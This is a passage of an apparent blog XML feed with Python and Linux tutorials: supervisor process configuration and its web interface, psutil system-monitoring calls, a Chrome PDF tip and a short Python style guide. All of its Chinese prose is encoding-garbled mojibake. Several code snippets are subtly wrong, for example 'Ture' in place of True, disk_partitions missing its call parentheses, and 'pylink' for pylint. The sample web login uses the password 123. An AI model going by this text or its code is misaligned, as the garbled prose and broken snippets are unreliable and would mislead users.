modeæ¨¡å¼çš„æ—¶å€™ï¼Œå†™å…¥FIFOé˜Ÿåˆ—çš„æœ€å¤§byteså€¼ï¼Œå•ä½å¯ä»¥æ˜¯KBã€MBã€GB</li><li>stderr_events_enabledï¼šå¦‚æœè®¾ç½®ä¸ºtrueï¼Œå½“è¿›ç¨‹åœ¨å†™å®ƒçš„stderråˆ°æ–‡ä»¶æè¿°ç¬¦çš„æ—¶å€™ï¼ŒPROCESS_LOG_STDERRäº‹ä»¶ä¼šè¢«è§¦å‘</li><li>environmentï¼šä¸€ä¸ªk&#x2F;vå¯¹çš„liståˆ—è¡¨</li><li>directoryï¼šsupervisordåœ¨ç”Ÿæˆå­è¿›ç¨‹çš„æ—¶å€™ä¼šåˆ‡æ¢åˆ°è¯¥ç›®å½•</li><li>umaskï¼šè®¾ç½®è¿›ç¨‹çš„umask</li><li>serverurlï¼šæ˜¯å¦å…è®¸å­è¿›ç¨‹å’Œå†…éƒ¨çš„HTTPæœåŠ¡é€šè®¯ï¼Œå¦‚æœè®¾ç½®ä¸ºAUTOï¼Œsupervisorä¼šè‡ªåŠ¨çš„æ„é€ ä¸€ä¸ªurl</li></ul><h2 id="é…ç½®æ–‡ä»¶å®ä¾‹"><a href="#é…ç½®æ–‡ä»¶å®ä¾‹" class="headerlink" title="é…ç½®æ–‡ä»¶å®ä¾‹"></a>é…ç½®æ–‡ä»¶å®ä¾‹</h2><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[program:sougou]</span>   <span class="hljs-comment">#souogu ä¸ºç¨‹åºçš„åç§°</span><br><span class="hljs-attr">command</span>=scrapy crawl sougou <span class="hljs-comment">#éœ€è¦æ‰§è¡Œçš„å‘½ä»¤</span><br><span class="hljs-attr">directory</span>=/home/mzj/æ¡Œé¢/sougou/sougou/wechat_name/wechat_name/spiders  <span class="hljs-comment">#å‘½ä»¤æ‰§è¡Œçš„ç›®å½•</span><br><span class="hljs-attr">environment</span>=ASPNETCORE__ENVIRONMENT=Production <span class="hljs-comment">#ç¯å¢ƒå˜é‡</span><br><span class="hljs-attr">user</span>=root <span class="hljs-comment">#ç”¨æˆ·</span><br><span class="hljs-attr">stopsignal</span>=INT<br><span class="hljs-attr">autostart</span>=<span class="hljs-literal">true</span> <span class="hljs-comment">#æ˜¯å¦è‡ªå¯åŠ¨</span><br><span class="hljs-attr">autorestart</span>=<span class="hljs-literal">true</span> <span class="hljs-comment">#æ˜¯å¦è‡ªåŠ¨é‡å¯</span><br><span class="hljs-attr">startsecs</span>=<span class="hljs-number">3</span> <span class="hljs-comment">#è‡ªåŠ¨é‡å¯æ—¶é—´é—´éš”ï¼ˆsï¼‰</span><br><span class="hljs-attr">stderr_logfile</span>=/home/mzj/æ¡Œé¢/sougou/sougou/wechat_name/wechat_name/spiders/oss<span class="hljs-literal">off</span>ical.err.log <span class="hljs-comment">#é”™è¯¯æ—¥å¿—æ–‡ä»¶</span><br><span class="hljs-attr">stdout_logfile</span>=/home/mzj/æ¡Œé¢/sougou/sougou/wechat_name/wechat_name/spiders/oss<span class="hljs-literal">off</span>ical.out.log <span class="hljs-comment">#è¾“å‡ºæ—¥å¿—æ–‡ä»¶</span><br></code></pre></td></tr></table></figure><h1 id="ä½¿ç”¨-web-ç•Œé¢ç®¡ç†"><a href="#ä½¿ç”¨-web-ç•Œé¢ç®¡ç†" class="headerlink" title="ä½¿ç”¨ web ç•Œé¢ç®¡ç†"></a>ä½¿ç”¨ web ç•Œé¢ç®¡ç†</h1><p>ä¿®æ”¹ <code>/etc/supervisord.conf</code> :</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">;[inet_http_server]         ; <span class="hljs-type">inet</span> (tcp) <span class="hljs-keyword">server</span> disabled <span class="hljs-keyword">by</span> <span class="hljs-keyword">default</span><br>;port=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">9001</span>        ; ip_address:port specifier, *:port <span class="hljs-keyword">for</span> <span class="hljs-keyword">all</span> iface<br>;username=<span class="hljs-keyword">user</span>              ; <span class="hljs-keyword">default</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">no</span> username (<span class="hljs-keyword">open</span> <span class="hljs-keyword">server</span>)<br>;<span class="hljs-keyword">password</span>=<span class="hljs-number">123</span>               ; <span class="hljs-keyword">default</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">password</span> (<span class="hljs-keyword">open</span> <span class="hljs-keyword">server</span>)<br></code></pre></td></tr></table></figure><p>å»æ‰æ³¨é‡Šç¬¦å·:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[inet_http_server]         ; <span class="hljs-type">inet</span> (tcp) <span class="hljs-keyword">server</span> disabled <span class="hljs-keyword">by</span> <span class="hljs-keyword">default</span><br>port=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">9001</span>        ; ip_address:port specifier, *:port <span class="hljs-keyword">for</span> <span class="hljs-keyword">all</span> iface<br>username=<span class="hljs-keyword">user</span>              ; <span class="hljs-keyword">default</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">no</span> username (<span class="hljs-keyword">open</span> <span class="hljs-keyword">server</span>)<br><span class="hljs-keyword">password</span>=<span class="hljs-number">123</span>               ; <span class="hljs-keyword">default</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">password</span> (<span class="hljs-keyword">open</span> <span class="hljs-keyword">server</span>)<br></code></pre></td></tr></table></figure><h1 id="ç”¨æ³•"><a href="#ç”¨æ³•" class="headerlink" title="ç”¨æ³•"></a>ç”¨æ³•</h1><ul><li>supervisord : å¯åŠ¨supervisor</li><li>supervisorctl reload :ä¿®æ”¹å®Œé…ç½®æ–‡ä»¶åé‡æ–°å¯åŠ¨supervisor</li><li>supervisorctl status :æŸ¥çœ‹supervisorç›‘ç®¡çš„è¿›ç¨‹çŠ¶æ€</li><li>supervisorctl start è¿›ç¨‹å ï¼šå¯åŠ¨XXXè¿›ç¨‹</li><li>supervisorctl stop è¿›ç¨‹å ï¼šåœæ­¢XXXè¿›ç¨‹</li><li>supervisorctl stop allï¼šåœæ­¢å…¨éƒ¨è¿›ç¨‹ï¼Œæ³¨ï¼šstartã€restartã€stopéƒ½ä¸ä¼šè½½å…¥æœ€æ–°çš„é…ç½®æ–‡ä»¶ã€‚</li><li>supervisorctl updateï¼šæ ¹æ®æœ€æ–°çš„é…ç½®æ–‡ä»¶ï¼Œå¯åŠ¨æ–°é…ç½®æˆ–æœ‰æ”¹åŠ¨çš„è¿›ç¨‹ï¼Œé…ç½®æ²¡æœ‰æ”¹åŠ¨çš„è¿›ç¨‹ä¸ä¼šå—å½±å“è€Œé‡å¯</li></ul>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python ä¸­ psutil åº“</title>
    <link href="/2022/08/28/Python-%E4%B8%AD-psutil-%E5%BA%93/"/>
    <url>/2022/08/28/Python-%E4%B8%AD-psutil-%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<h1 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h1><p>psutil æ˜¯ process and system utilities.</p><p>å…¶å®ç°äº† UNIX å‘½ä»¤è¡Œçš„è®¸å¤šåŠŸèƒ½ã€‚å¯è·¨å¹³å°ä½¿ç”¨ï¼Œç”¨äºç³»ç»Ÿç›‘æ§ï¼Œæ€§èƒ½åˆ†æï¼Œè¿›ç¨‹ç®¡ç†ã€‚</p><p><a href="https://psutil.readthedocs.io/en/latest">å®˜æ–¹æ–‡æ¡£</a></p><h1 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h1><h2 id="è·å–-CPU-ä¿¡æ¯"><a href="#è·å–-CPU-ä¿¡æ¯" class="headerlink" title="è·å– CPU ä¿¡æ¯"></a>è·å– CPU ä¿¡æ¯</h2><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-keyword">import</span> psutil<br><br></code></pre></td></tr></table></figure><h3 id="è·å–å®Œæ•´ä¿¡æ¯"><a href="#è·å–å®Œæ•´ä¿¡æ¯" class="headerlink" title="è·å–å®Œæ•´ä¿¡æ¯"></a>è·å–å®Œæ•´ä¿¡æ¯</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import psutil<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(psutil.cpu_times()</span></span>)<br></code></pre></td></tr></table></figure><h3 id="è·å–-CPU-é€»è¾‘ä¸ªæ•°"><a href="#è·å–-CPU-é€»è¾‘ä¸ªæ•°" class="headerlink" title="è·å– CPU é€»è¾‘ä¸ªæ•°"></a>è·å– CPU é€»è¾‘ä¸ªæ•°</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import psutil<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(psutil.cpu_count()</span></span>)<br></code></pre></td></tr></table></figure><h3 id="è·å–-CPU-ç‰©ç†ä¸ªæ•°"><a href="#è·å–-CPU-ç‰©ç†ä¸ªæ•°" class="headerlink" title="è·å– CPU ç‰©ç†ä¸ªæ•°"></a>è·å– CPU ç‰©ç†ä¸ªæ•°</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import psutil<br><br><span class="hljs-built_in">print</span>(psutil.cpu_count(<span class="hljs-attribute">logical</span>=<span class="hljs-literal">False</span>))<br></code></pre></td></tr></table></figure><h3 id="è·å–-CPU-ä½¿ç”¨ç‡"><a href="#è·å–-CPU-ä½¿ç”¨ç‡" class="headerlink" title="è·å– CPU ä½¿ç”¨ç‡"></a>è·å– CPU ä½¿ç”¨ç‡</h3><p>å…¶æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œå‰è€…ä¸º interval, æŒ‡å®šè®¡ç®— CPU ä½¿ç”¨ç‡çš„æ—¶é—´é—´éš”, åè€… percpu æŒ‡å®šéœ€è¦æ€»çš„ä½¿ç”¨ç‡è¿˜æ˜¯æ¯ä¸ª CPU çš„ä½¿ç”¨ç‡:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import psutil<br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(10):<br>    <span class="hljs-built_in">print</span>(psutil.cpu_percent(<span class="hljs-attribute">interval</span>=1))<br>    <span class="hljs-built_in">print</span>(psutil.cpu_percent(<span class="hljs-attribute">interval</span>=1, <span class="hljs-attribute">percpu</span>=Ture))<br></code></pre></td></tr></table></figure><h2 id="è·å–å†…å­˜ä¿¡æ¯"><a href="#è·å–å†…å­˜ä¿¡æ¯" class="headerlink" title="è·å–å†…å­˜ä¿¡æ¯"></a>è·å–å†…å­˜ä¿¡æ¯</h2><h3 id="è·å–å†…å­˜çš„ä½¿ç”¨æƒ…å†µ"><a href="#è·å–å†…å­˜çš„ä½¿ç”¨æƒ…å†µ" class="headerlink" title="è·å–å†…å­˜çš„ä½¿ç”¨æƒ…å†µ"></a>è·å–å†…å­˜çš„ä½¿ç”¨æƒ…å†µ</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import psutil<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(psutil.virtual_memory()</span></span>)<br></code></pre></td></tr></table></figure><h3 id="è·å–ç³»ç»Ÿäº¤æ¢å†…å­˜çš„ç»Ÿè®¡ä¿¡æ¯"><a href="#è·å–ç³»ç»Ÿäº¤æ¢å†…å­˜çš„ç»Ÿè®¡ä¿¡æ¯" class="headerlink" title="è·å–ç³»ç»Ÿäº¤æ¢å†…å­˜çš„ç»Ÿè®¡ä¿¡æ¯"></a>è·å–ç³»ç»Ÿäº¤æ¢å†…å­˜çš„ç»Ÿè®¡ä¿¡æ¯</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import psutil<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(psutil.swap_memory()</span></span>)<br></code></pre></td></tr></table></figure><h2 id="è·å–ç£ç›˜ä¿¡æ¯"><a href="#è·å–ç£ç›˜ä¿¡æ¯" class="headerlink" title="è·å–ç£ç›˜ä¿¡æ¯"></a>è·å–ç£ç›˜ä¿¡æ¯</h2><h3 id="è·å–ç£ç›˜åˆ†åŒºçš„ä¿¡æ¯"><a href="#è·å–ç£ç›˜åˆ†åŒºçš„ä¿¡æ¯" class="headerlink" title="è·å–ç£ç›˜åˆ†åŒºçš„ä¿¡æ¯"></a>è·å–ç£ç›˜åˆ†åŒºçš„ä¿¡æ¯</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import psutil<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(psutil.disk_partitions)</span></span><br></code></pre></td></tr></table></figure><h3 id="è·å–ç£ç›˜çš„ä½¿ç”¨æƒ…å†µ"><a href="#è·å–ç£ç›˜çš„ä½¿ç”¨æƒ…å†µ" class="headerlink" title="è·å–ç£ç›˜çš„ä½¿ç”¨æƒ…å†µ"></a>è·å–ç£ç›˜çš„ä½¿ç”¨æƒ…å†µ</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import psutil<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(psutil.disk_usage(<span class="hljs-string">&#x27;/&#x27;</span>)</span></span>)<br></code></pre></td></tr></table></figure><h3 id="è·å–ç£ç›˜çš„-IO-ç»Ÿè®¡ä¿¡æ¯-è¯»å†™é€Ÿåº¦ç­‰"><a href="#è·å–ç£ç›˜çš„-IO-ç»Ÿè®¡ä¿¡æ¯-è¯»å†™é€Ÿåº¦ç­‰" class="headerlink" title="è·å–ç£ç›˜çš„ IO ç»Ÿè®¡ä¿¡æ¯(è¯»å†™é€Ÿåº¦ç­‰)"></a>è·å–ç£ç›˜çš„ IO ç»Ÿè®¡ä¿¡æ¯(è¯»å†™é€Ÿåº¦ç­‰)</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import psutil<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(psutil.disk_io_counters()</span></span>)<br></code></pre></td></tr></table></figure><h2 id="è·å–ç½‘ç»œä¿¡æ¯"><a href="#è·å–ç½‘ç»œä¿¡æ¯" class="headerlink" title="è·å–ç½‘ç»œä¿¡æ¯"></a>è·å–ç½‘ç»œä¿¡æ¯</h2><h3 id="è·å–æ€»çš„ç½‘ç»œ-IO-ä¿¡æ¯"><a href="#è·å–æ€»çš„ç½‘ç»œ-IO-ä¿¡æ¯" class="headerlink" title="è·å–æ€»çš„ç½‘ç»œ IO ä¿¡æ¯"></a>è·å–æ€»çš„ç½‘ç»œ IO ä¿¡æ¯</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import psutil<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(psutil.net_io_counters()</span></span>)<br></code></pre></td></tr></table></figure><h3 id="è·å–ç½‘å¡çš„-IO-ä¿¡æ¯"><a href="#è·å–ç½‘å¡çš„-IO-ä¿¡æ¯" class="headerlink" title="è·å–ç½‘å¡çš„ IO ä¿¡æ¯"></a>è·å–ç½‘å¡çš„ IO ä¿¡æ¯</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import psutil<br><br><span class="hljs-built_in">print</span>(psutil.net_io_counters(<span class="hljs-attribute">pernic</span>=Ture))<br></code></pre></td></tr></table></figure><h3 id="è·å–ç½‘ç»œæ¥å£ä¿¡æ¯"><a href="#è·å–ç½‘ç»œæ¥å£ä¿¡æ¯" class="headerlink" title="è·å–ç½‘ç»œæ¥å£ä¿¡æ¯"></a>è·å–ç½‘ç»œæ¥å£ä¿¡æ¯</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import psutil<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(psutil.net_if_addrs()</span></span>)<br></code></pre></td></tr></table></figure><h3 id="è·å–ç½‘ç»œæ¥å£çŠ¶æ€ä¿¡æ¯"><a href="#è·å–ç½‘ç»œæ¥å£çŠ¶æ€ä¿¡æ¯" class="headerlink" title="è·å–ç½‘ç»œæ¥å£çŠ¶æ€ä¿¡æ¯"></a>è·å–ç½‘ç»œæ¥å£çŠ¶æ€ä¿¡æ¯</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import psutil<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(psutil.net_if_stats()</span></span>)<br></code></pre></td></tr></table></figure><h2 id="è·å–å…¶ä»–ç³»ç»Ÿä¿¡æ¯"><a href="#è·å–å…¶ä»–ç³»ç»Ÿä¿¡æ¯" class="headerlink" title="è·å–å…¶ä»–ç³»ç»Ÿä¿¡æ¯"></a>è·å–å…¶ä»–ç³»ç»Ÿä¿¡æ¯</h2><h3 id="è·å–ç³»ç»Ÿå¼€æœºçš„æ—¶é—´"><a href="#è·å–ç³»ç»Ÿå¼€æœºçš„æ—¶é—´" class="headerlink" title="è·å–ç³»ç»Ÿå¼€æœºçš„æ—¶é—´,"></a>è·å–ç³»ç»Ÿå¼€æœºçš„æ—¶é—´,</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import psutil<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(psutil.boot_time()</span></span>)<br></code></pre></td></tr></table></figure><h3 id="è·å–è¿æ¥ç³»ç»Ÿçš„ç”¨æˆ·åˆ—è¡¨"><a href="#è·å–è¿æ¥ç³»ç»Ÿçš„ç”¨æˆ·åˆ—è¡¨" class="headerlink" title="è·å–è¿æ¥ç³»ç»Ÿçš„ç”¨æˆ·åˆ—è¡¨"></a>è·å–è¿æ¥ç³»ç»Ÿçš„ç”¨æˆ·åˆ—è¡¨</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import psutil<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(psutil.users()</span></span>)<br></code></pre></td></tr></table></figure><h3 id="è·å–ç³»ç»Ÿå…¨éƒ¨çš„è¿›ç¨‹ä¿¡æ¯"><a href="#è·å–ç³»ç»Ÿå…¨éƒ¨çš„è¿›ç¨‹ä¿¡æ¯" class="headerlink" title="è·å–ç³»ç»Ÿå…¨éƒ¨çš„è¿›ç¨‹ä¿¡æ¯"></a>è·å–ç³»ç»Ÿå…¨éƒ¨çš„è¿›ç¨‹ä¿¡æ¯</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import psutil<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(psutil.pids()</span></span>)<br></code></pre></td></tr></table></figure><h3 id="è·å–å•ä¸ªè¿›ç¨‹çš„ä¿¡æ¯ï¼Œè·å–æŒ‡å®šè¿›ç¨‹-ID-x3D-100"><a href="#è·å–å•ä¸ªè¿›ç¨‹çš„ä¿¡æ¯ï¼Œè·å–æŒ‡å®šè¿›ç¨‹-ID-x3D-100" class="headerlink" title="è·å–å•ä¸ªè¿›ç¨‹çš„ä¿¡æ¯ï¼Œè·å–æŒ‡å®šè¿›ç¨‹ ID&#x3D;100"></a>è·å–å•ä¸ªè¿›ç¨‹çš„ä¿¡æ¯ï¼Œè·å–æŒ‡å®šè¿›ç¨‹ ID&#x3D;100</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">  import psutil<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(psutil.Process(<span class="hljs-number">100</span>)</span></span>)<br></code></pre></td></tr></table></figure><h2 id="æ¨¡æ‹Ÿ-ps-å‘½ä»¤æ•ˆæœ"><a href="#æ¨¡æ‹Ÿ-ps-å‘½ä»¤æ•ˆæœ" class="headerlink" title="æ¨¡æ‹Ÿ ps å‘½ä»¤æ•ˆæœ"></a>æ¨¡æ‹Ÿ ps å‘½ä»¤æ•ˆæœ</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import psutil<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(psutil.test()</span></span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä½¿ç”¨ Chrome æµè§ˆå™¨å°† markdown preview è¾“å‡ºä¸º PDF æ–‡ä»¶</title>
    <link href="/2022/08/28/%E4%BD%BF%E7%94%A8-Chrome-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B0%86-markdown-preview-%E8%BE%93%E5%87%BA%E4%B8%BA-PDF-%E6%96%87%E4%BB%B6/"/>
    <url>/2022/08/28/%E4%BD%BF%E7%94%A8-Chrome-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B0%86-markdown-preview-%E8%BE%93%E5%87%BA%E4%B8%BA-PDF-%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p>è¿›å…¥ Chrome æµè§ˆå™¨ï¼Œç‚¹å‡»å³é”®æ‰¾åˆ° <code>print</code> .</p>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python è¯­è¨€è§„èŒƒ</title>
    <link href="/2022/08/28/Python-%E8%AF%AD%E8%A8%80%E8%A7%84%E8%8C%83/"/>
    <url>/2022/08/28/Python-%E8%AF%AD%E8%A8%80%E8%A7%84%E8%8C%83/</url>
    
    <content type="html"><![CDATA[<h1 id="Python-è¯­è¨€è§„èŒƒ"><a href="#Python-è¯­è¨€è§„èŒƒ" class="headerlink" title="Python è¯­è¨€è§„èŒƒ"></a>Python è¯­è¨€è§„èŒƒ</h1><h2 id="Lint"><a href="#Lint" class="headerlink" title="Lint"></a>Lint</h2><h3 id="ä½¿ç”¨-pylint-å·¥å…·"><a href="#ä½¿ç”¨-pylint-å·¥å…·" class="headerlink" title="ä½¿ç”¨ pylint å·¥å…·"></a>ä½¿ç”¨ pylint å·¥å…·</h3><p>pylint æ˜¯ä¸€ä¸ªåœ¨ Python æºä»£ç ä¸­æŸ¥æ‰¾ bug çš„å·¥å…·ã€‚</p><p>å¯ä»¥ä½¿ç”¨ <code>pylint --list-msgs</code> æ¥è·å– pylint è­¦å‘Šåˆ—è¡¨ã€‚</p><p>ä½¿ç”¨ <code>pylink --help-msg=C6409</code> è·å–å…³äºç‰¹å®šæ¶ˆæ¯çš„æ›´å¤šä¿¡æ¯.</p><h2 id="å¯¼å…¥"><a href="#å¯¼å…¥" class="headerlink" title="å¯¼å…¥"></a>å¯¼å…¥</h2><p>ä»…å¯¹åŒ…å’Œæ¨¡å—è¿›è¡Œå¯¼å…¥ï¼Œè€Œä¸å•ç‹¬å¯¼å…¥å‡½æ•°æˆ–è€…ç±»ã€‚</p><p>ä½¿ç”¨ <code>from x import y as z</code> å½“æ¨¡å—å¤ªé•¿ã€‚</p><h2 id="åŒ…"><a href="#åŒ…" class="headerlink" title="åŒ…"></a>åŒ…</h2><p>ä½¿ç”¨æ¨¡å—çš„å…¨è·¯å¾„åæ¥å¯¼å…¥æ¯ä¸ªæ¨¡å—ã€‚</p><h2 id="å¼‚å¸¸"><a href="#å¼‚å¸¸" class="headerlink" title="å¼‚å¸¸"></a>å¼‚å¸¸</h2><p><code>ValueError</code> æŒ‡ç¤ºä¸€ä¸ªç¨‹åºé”™è¯¯ã€‚</p><p><code>assert</code> ä¿è¯å†…éƒ¨çš„æ­£ç¡®æ€§ã€‚</p><p><code>raise</code> è¯­å¥ï¼ŒæŒ‡ç¤ºæ„å¤–æƒ…å†µã€‚</p><p>å‡å°‘ <code>try/except</code> å—ä¸­çš„ä»£ç é‡ã€‚</p><p>ä½¿ç”¨ <code>finally</code> å­å¥æ¥æ‰§è¡Œé‚£äº›æ— è®º try å—ä¸­æœ‰æ²¡æœ‰å¼‚å¸¸éƒ½åº”è¯¥è¢«æ‰§è¡Œçš„ä»£ç ã€‚</p><h2 id="å…¨å±€å˜é‡"><a href="#å…¨å±€å˜é‡" class="headerlink" title="å…¨å±€å˜é‡"></a>å…¨å±€å˜é‡</h2><p>é¿å…å…¨å±€å˜é‡ã€‚</p><p>é¼“åŠ±ä½¿ç”¨æ¨¡å—çº§çš„å¸¸é‡å¦‚ <code>MAX_HOLY_HANDGRENADE_COUT = 3</code>ï¼Œå‘½åå…¨ç”¨å¤§å†™ä¸”ç”¨ <code>_</code> åˆ†éš”ã€‚</p><h2 id="æ¡ä»¶è¡¨è¾¾å¼"><a href="#æ¡ä»¶è¡¨è¾¾å¼" class="headerlink" title="æ¡ä»¶è¡¨è¾¾å¼"></a>æ¡ä»¶è¡¨è¾¾å¼</h2><p>é€‚ç”¨äºå•è¡Œå‡½æ•°ã€‚</p><p>åˆåä¸‰å…ƒè¿ç®—ç¬¦ï¼Œæ˜¯å¯¹äº if è¯­å¥çš„ä¸€ç§æ›´ç®€çŸ­çš„å¥æ³•è§„åˆ™:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span> if cond else <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æ­å»ºæ¢¯å­çš„åŸç†</title>
    <link href="/2022/08/28/%E6%90%AD%E5%BB%BA%E6%A2%AF%E5%AD%90%E7%9A%84%E5%8E%9F%E7%90%86/"/>
    <url>/2022/08/28/%E6%90%AD%E5%BB%BA%E6%A2%AF%E5%AD%90%E7%9A%84%E5%8E%9F%E7%90%86/</url>
    
